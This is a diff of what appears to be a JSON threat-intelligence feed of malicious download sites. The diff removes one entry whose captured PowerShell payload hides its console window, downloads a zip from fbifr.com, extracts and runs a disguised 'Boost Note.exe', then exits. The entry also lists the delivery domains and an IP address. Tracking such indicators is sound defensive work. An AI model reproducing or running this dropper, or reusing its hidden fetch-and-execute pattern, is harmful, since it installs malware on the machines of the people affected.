@@ -10002,24 +10002,5 @@
     ],
     "ReportId": "cmwjgekmp17wn0omlkwsofjbb",
     "ScannedAt": "2026-11-16T16:04:15.798000+00:00"
-  },
-  {
-    "UrlDomain": "futureexpected.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.83.140"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwjbc38k17of0omlpeppcn8t",
-    "ScannedAt": "2026-11-16T13:42:21.861000+00:00"
   }
 ]
